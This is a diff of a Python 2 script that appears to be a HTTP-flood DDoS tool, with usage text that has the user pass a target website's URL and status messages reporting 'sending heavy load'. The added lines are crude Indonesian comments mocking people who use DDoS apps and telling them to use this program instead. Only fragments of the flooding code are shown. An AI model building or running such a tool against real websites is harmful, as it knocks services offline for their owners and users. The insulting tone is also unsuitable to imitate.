@@ -1,3 +1,11 @@
+#Mau apa anjing?
+#nih aku beri tau cok ini itu namanya python bodoh
+#DDOS pake apk? Lawak banget wkwkwkw
+#DDOS tuh pake program su
+#Nyesel ditipu sama apk ddos?yg tidak ada gunanya? ups wkwkwkwk
+#Masih mau ngapain? mau record? hahahahaa, gak bisa buat sendiri? gak malu apa? wkwkwkwk
+#Belajar dulu sana bro wkwkwkwk
+
 import urllib2
 import sys
 import threading
@@ -823,10 +831,10 @@ def buildblock(size):
 	return(out_str)
 
 def usage():
-	print 'Masukan website yang mau di ddos syg =Url='
+	print 'Example: python2 Berat.py http://contoh.com'
 	print "\a"
-print \
-"""                        .
+print '--------------------------------------------------'
+"""                        
 __________________________________________________
 
 Author  : Profesor Acc
@@ -861,7 +869,7 @@ def httpcall(url):
 	except urllib2.HTTPError, e:
 			#print e.code
 			set_flag(1)
- 			print '[+] ~> MENGIRIM BEBAN BERAT  <~ [+]'
+ 			print '[!] ~> MENGIRIM BEBAN BERAT <~ [!]'
 			code=500
 	except urllib2.URLError, e:
 			#print e.reason
